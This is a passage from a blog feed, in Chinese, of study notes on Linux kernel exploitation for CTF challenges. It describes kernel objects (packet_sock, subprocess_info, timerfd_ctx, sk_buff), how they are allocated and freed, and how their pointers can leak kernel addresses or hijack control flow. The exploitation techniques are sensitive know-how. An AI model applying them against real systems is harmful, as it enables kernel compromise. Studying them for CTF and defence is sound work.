class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))<br><span class="hljs-keyword">return</span>;<br>fastpath:<br>kmem_cache_free(skbuff_fclone_cache, fclones);<br>&#125;<br></code></pre></td></tr></table></figure><p>从这里我们也可以看出 <code>sk_buff</code> 结构体也为我们提供了一个简陋的“菜单堆”功能，比较朴素的利用方式就是利用 <code>socketpair</code> 系统调用创建一对套接字，往其中一端写入以完成发包，从另一端读出以完成收包</p><blockquote><p>例题：D^3CTF2022 - d3kheap</p><p>利用参考：CVE-2021-22255</p></blockquote><h1 id="0x0A-packet-sock-与套接字相关（TBD）"><a href="#0x0A-packet-sock-与套接字相关（TBD）" class="headerlink" title="0x0A.packet_sock 与套接字相关（TBD）"></a>0x0A.packet_sock 与套接字相关（TBD）</h1><p><code>sock</code> 结构体是内核网络协议栈中的一个非常重要的基础结构体，<strong>用以在 <em>网络层</em> 表示一个 socket</strong>，内核以这个结构体为核心建立更高层面的抽象 socket，例如表示 BSD socket 的 <code>socket</code> 结构体或是 <code>inet_socket</code> 等结构体都有一个 <code>sock</code> 结构体成员，本节我们介绍 <code>AF_PACKET</code> 族所用到的套接字结构体 <code>packet_sock</code>——其通过常规的 kmalloc 路径进行分配</p><h2 id="packet-sock（kmalloc-2048-GFP-KERNEL）"><a href="#packet-sock（kmalloc-2048-GFP-KERNEL）" class="headerlink" title="packet_sock（kmalloc-2048 | GFP_KERNEL）"></a>packet_sock（kmalloc-2048 | GFP_KERNEL）</h2><p>packet socket 用以在 <em>设备驱动级</em> （OSI Layer 2，数据链路层）收发 raw packets，这允许用户在物理层之上应用用户空间中的协议模块</p><p>当我们通过 socket 系统调用创建 <code>AF_PACKET</code> 族的套接字时，在内核空间中会创建一个 <code>packet_sock</code> 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> &#123;</span><br><span class="hljs-comment">/* struct sock has to be the first member of packet_sock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span><span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_fanout</span>*<span class="hljs-title">fanout</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span>  <span class="hljs-title">tpacket_stats_u</span><span class="hljs-title">stats</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span><span class="hljs-title">rx_ring</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span><span class="hljs-title">tx_ring</span>;</span><br><span class="hljs-type">int</span>copy_thresh;<br><span class="hljs-type">spinlock_t</span>bind_lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">pg_vec_lock</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>running;<span class="hljs-comment">/* bind_lock must be held */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>auxdata:<span class="hljs-number">1</span>,<span class="hljs-comment">/* writer must hold sock lock */</span><br>origdev:<span class="hljs-number">1</span>,<br>has_vnet_hdr:<span class="hljs-number">1</span>,<br>tp_loss:<span class="hljs-number">1</span>,<br>tp_tx_has_off:<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span>pressure;<br><span class="hljs-type">int</span>ifindex;<span class="hljs-comment">/* bound device*/</span><br>__be16num;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_rollover</span>*<span class="hljs-title">rollover</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_mclist</span>*<span class="hljs-title">mclist</span>;</span><br><span class="hljs-type">atomic_t</span>mapped;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span><span class="hljs-title">tp_version</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_hdrlen;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_reserve;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_tstamp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">completion</span><span class="hljs-title">skb_completion</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">cached_dev</span>;</span><br><span class="hljs-type">int</span>(*xmit)(<span class="hljs-keyword">struct</span> sk_buff *skb);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_type</span><span class="hljs-title">prot_hook</span> ____<span class="hljs-title">cacheline_aligned_in_smp</span>;</span><br><span class="hljs-type">atomic_t</span>tp_drops ____cacheline_aligned_in_smp;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>当我们创建一个 packet socket 时内核便会分配一个 <code>packet_sock</code> 结构体，我们可以通过如下方式创建 packet socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));<br></code></pre></td></tr></table></figure><p>在内核中存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_socket()<br>    __sys_socket()<br>    sock_create()<br>    __sock_create()<br>    <span class="hljs-comment">// 首先在 net_families 数组中找协议族对应的 net_proto_family 结构体</span><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 对 AF_PACKET 而言，其在 packet_init() 中通过 sock_register()</span><br><span class="hljs-comment">     * 注册了packet_family_ops，其中 create 指针为 packet_create()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// 接下来会调用 net_proto_family 的 create 指针进行 sock 的创建</span><br>    packet_create()<br>    sk_alloc()<br></code></pre></td></tr></table></figure><p>在 <code>packet_create()</code> 中会调用 <code>sk_alloc()</code> 创建 sock 的空间，这是一个通用的创建 sock 的函数，这里我们注意到传入一个指向 proto 结构体类型全局变量 <code>packet_proto</code> 的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> kern)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, &amp;packet_proto, kern);<br></code></pre></td></tr></table></figure><p><code>sk_alloc()</code> 最后会调用到 <code>sk_prot_alloc()</code>，对于在协议对应的 proto 结构体中有指定 kmem_cache 的情况而言会直接从其中分配对象，否则走常规的 kmalloc 分配路径，这里我们注意到分配的 flag 为 <code>GFP_KERNEL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> sock *<span class="hljs-title function_">sk_prot_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> proto *prot, <span class="hljs-type">gfp_t</span> priority,</span><br><span class="hljs-params"><span class="hljs-type">int</span> family)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab</span>;</span><br><br>slab = prot-&gt;slab;<br><span class="hljs-keyword">if</span> (slab != <span class="hljs-literal">NULL</span>) &#123;<br>sk = kmem_cache_alloc(slab, priority &amp; ~__GFP_ZERO);<br><span class="hljs-keyword">if</span> (!sk)<br><span class="hljs-keyword">return</span> sk;<br><span class="hljs-keyword">if</span> (want_init_on_alloc(priority))<br>sk_prot_clear_nulls(sk, prot-&gt;obj_size);<br>&#125; <span class="hljs-keyword">else</span><br>sk = kmalloc(prot-&gt;obj_size, priority);<br><br><span class="hljs-keyword">if</span> (sk != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (security_sk_alloc(sk, family, priority))<br><span class="hljs-keyword">goto</span> out_free;<br><br><span class="hljs-keyword">if</span> (!try_module_get(prot-&gt;owner))<br><span class="hljs-keyword">goto</span> out_free_sec;<br>&#125;<br><br><span class="hljs-keyword">return</span> sk;<br><br>out_free_sec:<br>security_sk_free(sk);<br>out_free:<br><span class="hljs-keyword">if</span> (slab != <span class="hljs-literal">NULL</span>)<br>kmem_cache_free(slab, sk);<br><span class="hljs-keyword">else</span><br>kfree(sk);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分配的对象 size 为 <code>proto-&gt;obj_size</code>，在 <code>packet_proto</code> 中指定为 <code>packet_sock</code> 的大小，在各个版本上可能略有不同（笔者的机子上是1500+，也见到有1400+的），不过大小浮动不大，最终都会从 <code>kmalloc-2k</code> 中取对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> <span class="hljs-title">packet_proto</span> =</span> &#123;<br>.name  = <span class="hljs-string">&quot;PACKET&quot;</span>,<br>.owner  = THIS_MODULE,<br>.obj_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> packet_sock),<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="释放-1"><a href="#释放-1" class="headerlink" title="释放"></a>释放</h3><p>当我们关闭对应的套接字时就能释放对应的 sock 结构体了</p><p>众所周知 Linux 中“一切皆文件”，在我们创建一个套接字时其实内核中会创建一个 file 结构体并返回给我们一个文件描述符，在 <code>__sys_socket()</code> 中会通过 <code>sock_map_fd()</code> 分配一个文件描述符并将套接字文件的函数表设为 <code>socket_file_ops</code>，其中 close 指针对应的函数应为 <code>sock_close()</code>，其实为 <code>__sock_release() </code>的 wrapper</p><p>该函数会检查 socket 的函数表，若有则直接调用其函数表的 release 函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __sock_release(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-keyword">struct</span> inode *inode)<br>&#123;<br><span class="hljs-keyword">if</span> (sock-&gt;ops) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span> =</span> sock-&gt;ops-&gt;owner;<br><br><span class="hljs-keyword">if</span> (inode)<br>inode_lock(inode);<br>sock-&gt;ops-&gt;release(sock);<br>sock-&gt;sk = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (inode)<br>inode_unlock(inode);<br>sock-&gt;ops = <span class="hljs-literal">NULL</span>;<br>module_put(owner);<br>&#125;<br><br><span class="hljs-keyword">if</span> (sock-&gt;wq.fasync_list)<br>pr_err(<span class="hljs-string">&quot;%s: fasync list not empty!\n&quot;</span>, __func__);<br><br><span class="hljs-keyword">if</span> (!sock-&gt;file) &#123;<br>iput(SOCK_INODE(sock));<br><span class="hljs-keyword">return</span>;<br>&#125;<br>sock-&gt;file = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个表的设置其实在 <code>sk_alloc()</code> 中通过协议族对应的结构体的 create 函数指针执行过程中进行指定，对应 packet socket 而言即在 <code>packet_create()</code> 中指定，这里我们可以看到函数表被设为 <code>packet_ops</code> 或 <code>packet_ops_spkt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>sock-&gt;ops = &amp;packet_ops;<br><span class="hljs-keyword">if</span> (sock-&gt;type == SOCK_PACKET)<br>sock-&gt;ops = &amp;packet_ops_spkt;<br></code></pre></td></tr></table></figure><p>这两个函数表的 release 指针对应的都是 <code>packet_release()</code>，最终存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    sock_put()<br>    sk_free() <span class="hljs-comment">// 引用计数为 0 时调用，释放 sock 结构体</span><br></code></pre></td></tr></table></figure><blockquote><p>注意不要混淆了 sock 和 socket 哟，不知道的可以去百度（笑）</p></blockquote><h3 id="数据泄露-6"><a href="#数据泄露-6" class="headerlink" title="数据泄露"></a>数据泄露</h3><h3 id="劫持内核执行流-3"><a href="#劫持内核执行流-3" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><h1 id="0x0B-subprocess-info-与套接字相关"><a href="#0x0B-subprocess-info-与套接字相关" class="headerlink" title="0x0B.subprocess_info 与套接字相关"></a>0x0B.subprocess_info 与套接字相关</h1><p>Linux 内核的网络协议栈的一系列操作同样涉及到一系列的结构体，其中 <code>subprocess_info</code> 便是一个比较神奇的结构体，这里也来简单介绍一下</p><h2 id="subprocess-info：kmalloc-128"><a href="#subprocess-info：kmalloc-128" class="headerlink" title="subprocess_info：kmalloc-128"></a>subprocess_info：kmalloc-128</h2><blockquote><p>感觉没啥好说的…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">completion</span> *<span class="hljs-title">complete</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *path;<br><span class="hljs-type">char</span> **argv;<br><span class="hljs-type">char</span> **envp;<br><span class="hljs-type">int</span> wait;<br><span class="hljs-type">int</span> retval;<br><span class="hljs-type">int</span> (*init)(<span class="hljs-keyword">struct</span> subprocess_info *info, <span class="hljs-keyword">struct</span> cred *new);<br><span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> subprocess_info *info);<br><span class="hljs-type">void</span> *data;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h3 id="产生-amp-释放"><a href="#产生-amp-释放" class="headerlink" title="产生 &amp; 释放"></a>产生 &amp; 释放</h3><p>当我们尝试创建一个未知协议（<code>socket(22, AF_INET, 0)</code>）时，便会创建一个 <code>subprocess_info</code> 结构体，对应地，在系统调用结束之后该结构体便会被立即释放，过程其实有点类似 setxattr，不同的是没有任何用户空间数据会被拷贝至内核空间</p><p>因为该结构体在创建之后就会被释放掉，因此基于该结构体的利用都要用到条件竞争，笔者认为其实不是特别的方便</p><blockquote><p>笔者本想分析一下其创建与释放的调用链，但是大量使用了 LSM hook 看着实在头疼，就此作罢，就利用层面而言这个结构体也不是特别好用+稳定，所以这里只抄一些总结性的结论XD</p></blockquote><h3 id="数据泄露（条件竞争）"><a href="#数据泄露（条件竞争）" class="headerlink" title="数据泄露（条件竞争）"></a>数据泄露（条件竞争）</h3><h4 id="内核-text-段地址-4"><a href="#内核-text-段地址-4" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>该结构体的 <code>work.func</code> 可能指向 <code>call_usermodehelper_exec_work</code>，若是我们能利用条件竞争读出该指针便能泄露出内核的 .text 段的基址</p><h3 id="劫持内核执行流（条件竞争）"><a href="#劫持内核执行流（条件竞争）" class="headerlink" title="劫持内核执行流（条件竞争）"></a>劫持内核执行流（条件竞争）</h3><p>在释放该结构体时会调用其 <code>cleanup</code> 指针成员，若是我们能够在创建该结构体之后、释放该结构体之前劫持该指针便能控制内核执行流</p><blockquote><p>例题：SCTF2022 - flying_kernel</p><blockquote><p>笔者在比赛中死活竞争不出来，就很离谱…所以暂时没有 wp（🕊</p></blockquote></blockquote><h1 id="0x0C-timerfd-ctx-与-timerfd-系列系统调用"><a href="#0x0C-timerfd-ctx-与-timerfd-系列系统调用" class="headerlink" title="0x0C.timerfd_ctx 与 timerfd 系列系统调用"></a>0x0C.timerfd_ctx 与 timerfd 系列系统调用</h1><p>自 2.6.25 版本起 Linux 提供了一种可以用以创建定时器的系统调用——timerfd 系列系统调用，相比起定时器的功能，我们更加关注系统调用过程中涉及到的 <code>timerfd_ctx</code> 结构体</p><h2 id="timerfd-ctx（kmalloc-256-GPF-KERNEL）"><a href="#timerfd-ctx（kmalloc-256-GPF-KERNEL）" class="headerlink" title="timerfd_ctx（kmalloc-256 | GPF_KERNEL）"></a>timerfd_ctx（kmalloc-256 | GPF_KERNEL）</h2><p>该结构体定义于 <code>fs/timerfd.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timerfd_ctx</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hrtimer</span> <span class="hljs-title">tmr</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alarm</span> <span class="hljs-title">alarm</span>;</span><br>    &#125; t;<br>    <span class="hljs-type">ktime_t</span> tintv;<br>    <span class="hljs-type">ktime_t</span> moffs;<br>    <span class="hljs-type">wait_queue_head_t</span> wqh;<br>    u64 ticks;<br>    <span class="hljs-type">int</span> clockid;<br>    <span class="hljs-type">short</span> <span class="hljs-type">unsigned</span> expired;<br>    <span class="hljs-type">short</span> <span class="hljs-type">unsigned</span> settime_flags;    <span class="hljs-comment">/* to show in fdinfo */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">clist</span>;</span><br>    <span class="hljs-type">spinlock_t</span> cancel_lock;<br>    <span class="hljs-type">bool</span> might_cancel;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的 <code>hrtimer</code> 结构体定义于 <code>/include/linux/hrtimer.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hrtimer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timerqueue_node</span>        <span class="hljs-title">node</span>;</span><br>    <span class="hljs-type">ktime_t</span>                _softexpires;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title function_">hrtimer_restart</span>        <span class="hljs-params">(*function)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> hrtimer *)</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hrtimer_clock_base</span>    *<span class="hljs-title">base</span>;</span><br>    u8                state;<br>    u8                is_rel;<br>    u8                is_soft;<br>    u8                is_hard;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配-x2F-释放-2"><a href="#分配-x2F-释放-2" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>我们可以通过 <code>timerfd_create</code> 系统调用来分配一个 <code>timerfd_ctx</code> 结构体，在 <code>fs/timerfd.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE2(timerfd_create, <span class="hljs-type">int</span>, clockid, <span class="hljs-type">int</span>, flags)<br>&#123;<br>    <span class="hljs-type">int</span> ufd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timerfd_ctx</span> *<span class="hljs-title">ctx</span>;</span><br><br>    <span class="hljs-comment">//...</span><br><br>    ctx = kzalloc(<span class="hljs-keyword">sizeof</span>(*ctx), GFP_KERNEL);<br><br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>同样地，对于 timerfd 文件在 <code>fs/timerfd.c</code> 中定义了其函数表 <code>timerfd_ops</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">timerfd_fops</span> =</span> &#123;<br>    .release    = timerfd_release,<br>    .poll        = timerfd_poll,<br>    .read        = timerfd_read,<br>    .llseek        = noop_llseek,<br>    .show_fdinfo    = timerfd_show,<br>    .unlocked_ioctl    = timerfd_ioctl,<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中 <code>timerfd_release</code> 定义于 <code>fs/timerfd.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">timerfd_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timerfd_ctx</span> *<span class="hljs-title">ctx</span> =</span> file-&gt;private_data;<br><br>    timerfd_remove_cancel(ctx);<br><br>    <span class="hljs-keyword">if</span> (isalarm(ctx))<br>        alarm_cancel(&amp;ctx-&gt;t.alarm);<br>    <span class="hljs-keyword">else</span><br>        hrtimer_cancel(&amp;ctx-&gt;t.tmr);<br>    kfree_rcu(ctx, rcu);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>即我们可以通过关闭 timerfd 文件来释放 timerfd_ctx 结构体</p><h3 id="数据泄露-7"><a href="#数据泄露-7" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-5"><a href="#内核-text-段地址-5" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>timerfd_ctx 的 tmr 字段的 <code>function</code> 字段指向内核代码段（笔者尚未求证具体指向函数），若能泄漏出该指针则我们便毫无疑问能泄漏出内核基址</p><h4 id="内核线性映射区（-direct-mapping-area）-4"><a href="#内核线性映射区（-direct-mapping-area）-4" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>timerfd_ctx 的 tmr 字段的 <code>base</code> 字段指向内核“堆”上，若能泄露该字段我们同样能泄漏出内核的“堆上地址”</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我是小小做题家&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://blog.arttnba3.cn/categories/PWN/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x02】Linux 内核内存管理I - 页、区、节点</title>
    <link href="http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/</id>
    <published>2021-11-27T18:45:29.000Z</published>
    <updated>2022-08-28T20:47:31.842Z</updated>
    
    <content type="html"><![CDATA[<p>无内鬼，来点内存条</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本系列文章将通过 Linux 5.11 的源代码简要分析 Linux 内核中的<strong>内存管理</strong>（memory management）部分，笔者选择采用自底向上的方式来逐层分析，本篇文章便从最基础的<strong>页框</strong>开始进行分析</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>这是一张十分经典的 _Overview_，自顶向下是</p><ul><li><strong>节点</strong>（node，对应结构体 pgdata_list）</li><li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li><li><strong>页</strong>（page，对应结构体 page）</li></ul><p><img src="https://i.loli.net/2021/11/28/OrsvS6GTMgPLx5E.png" alt="image.png"></p><p>我们可以通过 <code>cat /proc/buddyinfo</code> 与 <code>cat /proc/pagetypeinfo</code> 查看页面相关信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 